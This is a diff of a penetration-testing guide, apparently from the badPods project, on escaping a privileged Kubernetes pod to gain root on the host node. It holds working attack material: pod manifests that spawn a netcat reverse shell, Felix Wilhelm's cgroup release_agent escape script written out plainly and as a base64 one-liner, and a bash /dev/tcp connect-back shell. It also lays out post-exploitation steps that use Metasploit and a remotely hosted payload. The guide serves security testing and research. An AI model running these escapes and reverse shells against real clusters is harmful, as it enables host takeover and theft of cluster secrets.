@@ -1,98 +1,70 @@
-## You can create a pod with only privileged: true
+# Bad Pod #3: Privileged
 
-If you only have `privileged=true`, you can get interactive root access on the node, but you must jump through a few hoops first. You can use Felix Wilhelm's exploit PoC undock.sh to execute one command a time, or you  can use Brandon Edwards and Nick Freeman’s version which forces the host to connect back to the a listener on the pod for an easy upgrade to interactive root access on the host. Another option is to use the Metasploit module “docker privileged container escape” which uses the same exploit to upgrade a shell received from a container to a shell on the host. 
+If you only have `privileged: true`, there are two paths you can take: 
+* **Mount the host’s filesystem** – You can mount the host’s filesystem into your pod using the mount command, which gives you roughly the same level of access as the next example, Bad Pod #4: hostPath.  
+*	**Exploit cgroup usermode helper programs** – If that is not enough access to accomplish your goals, you can get interactive root access on the node, but you must jump through a few hoops first. You can use Felix Wilhelm's exploit PoC `undock.sh` to execute one command a time, or you can use Brandon Edwards and Nick Freeman’s version  from their talk A Compendium of Container Escapes, which forces the host to connect back to the a listener on the pod for an easy upgrade to interactive root access on the host. Another option is to use the Metasploit module docker privileged container escape which uses the same exploit to upgrade a shell received from a container to a shell on the host. 
 
-In either case, the kubernetes privesc paths as the same as with the other pods where you get root access on the node. One promising privesc path is available if you can schedule your pod to run on the control plane node using the `nodeName` selector (not possible in most cloud hosted k8s environments). Even if you can only schedule your pod on the worker node, you can access the node's kubelet credentials or you can create mirror/static pods in any namespace. You can also access any secret mounted within any pod on the node you are on. **In a production cluster, even on a worker node, there is usually at least one pod that has a `token` mounted that is bound to a `service account` that is bound to a `clusterrolebinding`, that gives you access to do things like create pods or view secrets in all namespaces**.  
+Whichever option you choose, the Kubernetes privilege escalation paths are the largely the same as the Bad Pod #1: Everything-allowed. 
+
 
 # Pod Creation
-
 ## Create a pod you can exec into
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pod-priv
-  labels: 
-    app: pentest
-spec:
-  containers:
-  - name: priv
-    image: ubuntu
-    command: [ "/bin/bash", "-c", "--" ]
-    args: [ "while true; do sleep 30; done;" ]
-    securityContext:
-      privileged: true
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
-  ```
-[pod-priv.yaml](pod-priv.yaml)
-
-#### Option 1: Create pod from local yaml 
+Create pod
 ```bash
-kubectl apply -f pod-priv.yaml   
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml 
 ```
-
-#### Option 2: Create pod from github hosted yaml
+Exec into pod 
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/priv/pod-priv.yaml  
+kubectl exec -it priv-exec-pod -- bash
 ```
 
-### Exec into pod 
-```bash
-kubectl -n [namespace] exec -it pod-priv -- bash
-```
+## Reverse shell pod
 
-## Or, create a reverse shell pod
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pod-priv-and-hostpid-revshell
-  labels: 
-    app: pentest
-spec:
-  hostPID: true
-  containers:
-  - name: priv-and-hostpid-revshell
-    image: busybox
-    command: [ "/bin/sh", "-c", "--" ]
-    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-    securityContext:
-      privileged: true
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
-  restartPolicy: Always
-```
-[pod-priv-revshell.yaml](pod-priv-revshell.yaml)
-
-#### Set up listener
+Set up listener
 ```bash
 nc -nvlp 3116
 ```
 
-#### Create the pod
+Create pod from local manifest without modifying it by using env variables and envsubst
 ```bash
-# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/priv/pod/priv-revshell-pod.yaml | kubectl apply -f -
 ```
 
-#### Catch the shell 
+Catch the shell
 ```bash
-~ nc -nvlp 3116
+$ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 ```
 
 # Post exploitation
 
-So this could be a limitation of my linux-fu, but I have not been able to use Felix's exploit to directly spawn a remote connection of any kind. However, there are three good options when it comes to post exploitation: 
+## Mount the host's filesystem
 
-* Use Felix Wilhelm's undock.sh and hunt around with non-interactive access
-* Use the metasploit module: docker_privileged_container_escape
-* Use undock.sh to download your own reverse shell script and then execute it spawn the reverse shell
 
+## Remote code execution
+
+There are multiple options when it comes to gaining RCE with root's privileges on the host: 
+
+* Option 1: Use Felix Wilhelm's `undock.sh` and hunt around with non-interactive access
+* Option 2: Use Brandon Edwards and Nick Freeman’s version which upgrades you to an interactive shell
+* Option 3: Use the metasploit module: `docker_privileged_container_escape`
+* Option 4: Use `undock.sh` to download your own reverse shell script and then execute it spawn the reverse shell
 
 ### Option 1: Use Felix Wilhelm's undock.sh and hunt around with non-interactive access
 
 #### Create undock script that will automate the container escape POC
+
+Drop this into `undock.sh`
+```bash
+#!/bin/bash
+d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
+mkdir -p $d/w;echo 1 >$d/w/notify_on_release
+t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
+$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
+```
+Or, use this one-liner: 
 ```bash
 echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > undock.sh 
 ```
@@ -121,12 +93,11 @@ nc -l -p 9001
 #### Find the IP address of your POD
 This next script, `shell.sh` is executed on the host node and it will call back to the listener on your pod, so you'll need to use the pod's IP
 
-
 #### Create the connect back script
 Drop this into `/shell.sh` on the pod. If you change the name of your script, change it in escape.sh as well. 
 ```
 #!/bin/bash
-/bin/bash -c "/bin/bash -i >& /dev/tcp/10.100.254.137/9001 0>&1"
+/bin/bash -c "/bin/bash -i >& /dev/tcp/POD_IP/9001 0>&1"
 ```
 
 #### Make both scripts executable
@@ -205,7 +176,7 @@ eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[REDACTED]
 ```
 
 ### Option 4: Use undock.sh to download your own payload and then execute it spawn the reverse shell 
-I'm not sure why you would need this forth option, but I use this before I found Brandon Edwards and Nick Freeman's talk. It works, just adds an unecessary callback to a remote server. 
+I'm not sure why you would need this forth option, but I use this before I found Brandon Edwards and Nick Freeman's talk. It works, just adds an unnecessary callback to a remote server. 
 
 #### Create a payload and host it on your remote box
 ```bash
